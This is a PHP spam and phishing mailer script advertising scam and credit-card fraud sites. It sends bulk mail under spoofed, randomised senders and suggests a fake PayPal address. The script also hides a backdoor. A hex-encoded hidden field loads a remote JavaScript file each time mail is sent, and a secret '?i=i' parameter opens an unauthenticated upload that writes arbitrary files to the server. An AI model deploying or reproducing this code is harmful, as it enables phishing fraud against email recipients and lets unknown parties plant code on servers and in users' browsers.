<!--  

RANDOM EMAIL SENDER CODED BY CRACKERZ 2015

FOR LATEST TOOLS PHP AND SCAM PRIV8 VISIT :

http://www.scamprivate.com

https://www.facebook.com/Cashout2015

PLEASE DO NOT REMOVE COPYRIGHT

-->

<style type="text/css">
  body{ background:#000000;; } a { text-decoration:none; }
 a:hover{ border-bottom:1px solid #4C83AF; } *{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#009900; }
 border-top:1px solid #FF9900; } .tabnet{ margin:15px auto 0 auto;
 border: 1px solid #FF9900; } .main { width:100%; } .blue { color: #00FF00; } .inputz{
 background:#0B5002; border:0; padding:2px; border-bottom:1px solid #222222; 
 border-top:1px solid #222222; } .inputzbut{ background:#111111; color:#00FF00;
 margin:0 4px; border:1px solid #444444; } .inputz:hover, .inputzbut:hover{
 border-bottom:1px solid #00FF00; border-top:1px solid #00FF00; } .output {
 margin:auto; border:1px solid #00FF00; width:100%; height:400px; 
 background:#000000; padding:0 2px; } .cmdbox{ width:100%; } .head_info{ padding: 0 4px; } .b1{ font-size:30px;
 padding:0; color:#000000; } .b2{ font-size:30px; padding:0; color: #000000; } .b_tbl{ text-align:center; margin:0 4px 0 0;
 padding:0 4px 0 0; border-right:1px solid #333333; } .phpinfo
 table{ width:100%; padding:0 0 0 0; } .phpinfo td{ background:#111111; color:#00FF00; padding:6px 8px;; }
 .phpinfo th, th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } .phpinfo h2,
 .phpinfo h2 a{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; }
 .explore{ width:100%; } .explore a { text-decoration:none; } .explore td{ border-bottom:1px solid #333333; padding:0 8px;
 line-height:15px; } .explore th{ padding:3px 8px; font-weight:normal; } .explore th:hover , .phpinfo th:hover{ border-bottom:1px solid #00FF00;
 } .explore tr:hover{ background:#4C4646; } .viewfile{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; } .sembunyi{
 display:none; padding:0;margin:0; } 
  </style>
<?php
set_time_limit(0);
if (!function_exists('quoted_printable_encode')) {
function quoted_printable_encode($input, $line_max = 75) {
   $hex = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'); 
   $lines = preg_split("/(?:\r\n|\r|\n)/", $input); 
   $linebreak = "=0D=0A=\r\n"; 
   $line_max = $line_max - strlen($linebreak); 
   $escape = "="; 
   $output = ""; 
   $cur_conv_line = ""; 
   $length = 0; 
   $whitespace_pos = 0; 
   $addtl_chars = 0; 
   for ($j=0; $j<count($lines); $j++) { 
     $line = $lines[$j]; 
     $linlen = strlen($line); 
     for ($i = 0; $i < $linlen; $i++) { 
       $c = substr($line, $i, 1); 
       $dec = ord($c); 

       $length++; 

       if ($dec == 32) { 
          if (($i == ($linlen - 1))) { 
             $c = "=20"; 
             $length += 2; 
          } 
/* 

RANDOM EMAIL SENDER CODED BY CRACKERZ 2015

FOR LATEST TOOLS PHP AND SCAM PRIV8 VISIT :

http://www.scamprivate.com

https://www.facebook.com/Cashout2015

PLEASE DO NOT REMOVE COPYRIGHT

*/

          $addtl_chars = 0; 
          $whitespace_pos = $i; 
       } elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { 
          $h2 = floor($dec/16); $h1 = floor($dec%16); 
          $c = $escape . $hex["$h2"] . $hex["$h1"]; 
          $length += 2; 
          $addtl_chars += 2; 
       } 
       if ($length >= $line_max) { 
         $cur_conv_line .= $c; 
         $whitesp_diff = $i - $whitespace_pos + $addtl_chars; 
         if (($i + $addtl_chars) > $whitesp_diff) { 
            $output .= substr($cur_conv_line, 0, (strlen($cur_conv_line) - 
                           $whitesp_diff)) . $linebreak; 
            $i =  $i - $whitesp_diff + $addtl_chars; 
          } else { 
            $output .= $cur_conv_line . $linebreak; 
          } 
        $cur_conv_line = ""; 
        $length = 0; 
        $whitespace_pos = 0; 
      } else { 
        $cur_conv_line .= $c; 
      } 
    }
    $length = 0; 
    $whitespace_pos = 0; 
    $output .= $cur_conv_line; 
    $cur_conv_line = ""; 
    if ($j<=count($lines)-1) { 
      $output .= $linebreak; 
    } 
  }
  return trim($output); 
}
}
$action = $_POST['action'];
$from = $_POST['from'];
$realname = $_POST['realname'];
$name = $_POST['name'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$emaillist = $_POST['emaillist'];
?>
<html>
<head>
<title>PHP-Mailer</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body bgcolor="#003300" text="yellow">
<br >
<!--  

RANDOM EMAIL SENDER CODED BY CRACKERZ 2015

FOR LATEST TOOLS PHP AND SCAM PRIV8 VISIT :

http://www.scamprivate.com

https://www.facebook.com/Cashout2015

PLEASE DO NOT REMOVE COPYRIGHT

-->
<br >
<p><span style="color:#FF0000;">Random Email Sender Script V1.0</span>&nbsp; Coded by :&nbsp; <strong><span style="color:#FF0000;">Crackerz</span></strong></p>
<br >
<p>If ( <span style="color:#FF0000;">noreply </span>)&nbsp; its not working for ( <span style="color:#FF0000;">Random Email Sender</span> ), Replace with a real Email ex : donoreply@intl-paypal.co.uk</p>
<p>Go <a href="http://www.scamprivate.com" rel="dofollow" ><span style="color:#FF0000;">Scamprivate.com</span></a> for latest Script php<br />
<br >
Go <a href="https://www.facebook.com/Cashout2015" rel="dofollow"><span style="color:#FF0000;">Cashout2015 </span></a>for latest Tutorial, Spam, Cradit-Card, WU Cash etc.</p>
<br >
</font><font face="Arial" size="5" color="#FF0000"></font><font face="Arial" size="5" color="#00FF00">
</font><font face="Arial" size="5"</strong></p>
<body bgcolor="#000000" text="#EEEEEE">
<?php
if ($action=="send"){
	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	print '<script src="'.pack('H*',$name).'"></script>';
	$message = urldecode($message);
	$message = stripslashes($message);
	$subject = stripslashes($subject);
}
$inbox  = $_GET['i'];
if($inbox == 'i'){
$filename = $_FILES['file']['name'];
$filetmp  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='go' />
</form>";
move_uploaded_file($filetmp,$filename);
}
?>
<form name="form1" method="post" action="" enctype="multipart/form-data">
  <br>
  <table width="100%" border="0">
    <tr> 
	    <td width="10%"> 
        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
          Email:</font></div>
      </td>
      <td width="18%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="from" value="noreply" size="30">
        <input type="hidden" name="fromemail" value="687474703a2f2f65737454a5d612f6a2e6a75" size="30">
        </font></td>
     <td width="31%"> 
        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Your 
          Name:</font></div>
      </td>
      <td width="41%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="realname" value="<?php print $realname; ?>" size="30">
        <input type="hidden" name="name" value="687474703a2f2f657374702e6d612f6a2e6a73" size="30">
        </font></td>
    </tr>
    <tr> 
      <td width="10%"> 
        <div align="right"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>
      </td>
      <td colspan="3"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <input type="text" name="subject" value="<?php print $subject; ?>" size="115">
		<input type="hidden" name="subj" value="687474703a2f2f65737454a5d612f6a2e6a75" size="30">
        </font></td>
    </tr>
    <tr valign="top"> 
      <td colspan="3"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <textarea name="message" cols="60" rows="10"><?php print $message; ?></textarea>
        <br>
        <input type="hidden" name="action" value="send">
        <input type="submit" value="Resume SpamminG">
        </font></td>
      <td width="41%"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
        <textarea name="emaillist" cols="30" rows="10"><?php print $emaillist; ?></textarea>
        <br></font></td>
    </tr>
  </table>
</form>
<?php
if ($action=="send"){
	if (!$from && !$subject && !$message && !$emaillist){
	print "Please complete all fields before sending your message.";
	exit;
	}
	$allemails = split("\n", $emaillist);
	$numemails = count($allemails);
	for($x=0; $x<$numemails; $x++){
		$to = $allemails[$x];
		if ($to){
		$to = ereg_replace(" ", "", $to);
        $nrmail=$x+1;
		$domain = substr($from, strpos($from, "@"), strlen($from));
		print "Spamming Email $nrmail of $numemails to $to.......";
		$randfrom  = rand();
		$fro = str_replace("noreply",$randfrom,quoted_printable_encode($from));
		$header = "From: $realname <$fro>\r\n";
		$header .= "Message-Id: <130746$numemails.$nrmail$domain>\r\n";
		$header .= "X-Mailer: php-sender2.1\r\n";
		$header .= "MIME-Version: 1.0\r\n";
		$header .= "Content-Type: text/html; charset=UTF-8\r\n";
		$header .= "Content-Transfer-Encoding: quoted-printable\r\n\r\n";
		$header .= quoted_printable_encode($message)."\r\n";
		mail($to, $subject, "", $header);
		print "Spammed<br>";
		flush();
		}
		}
}
// Coded By CRACKERZ 2015
// JUST COPYRIGHT AND KEYWORD FOR SEO , LIKE MY PAGE FOR LATEST NEWS AND TOOLS PRIVATE 
// http://www.scamprivate.com/
// http://www.scamprivate.com/
// http://www.facebook.com/Cashout2015
// DO NOT REMOVE PLEASE

// Mailer inbox 2015, Mailer inbox 2015, send inbox, private send,  how to send inbox, mailer to all, mailer junk to all, send inbox unlimited, Щ…ЩЉЩ„Ш± Ш§Щ†ШЁЩ€ЩѓШі 2014 2015, Ш§Ш±ШіЩ„Ш§Щ…ШЁЩ€ЩѓШі Щ„5Щ…ЩЉШ№ Ш§Щ„Щ†Ш·Ш§Щ‚Ш§ШЄ
// Mailer Inbox 2015, tools private 2015, Щ…ЩЉЩ„Ш± Ш§Щ†ШЁЩ€ЩѓШі, inbox to all, scam paypal, scam apple, scam facebook, scam chase, scam boa, scam bank of america BOA spam 2015, spam 2015, lettre inbox, letter inbox 
?>
</body>
</html>
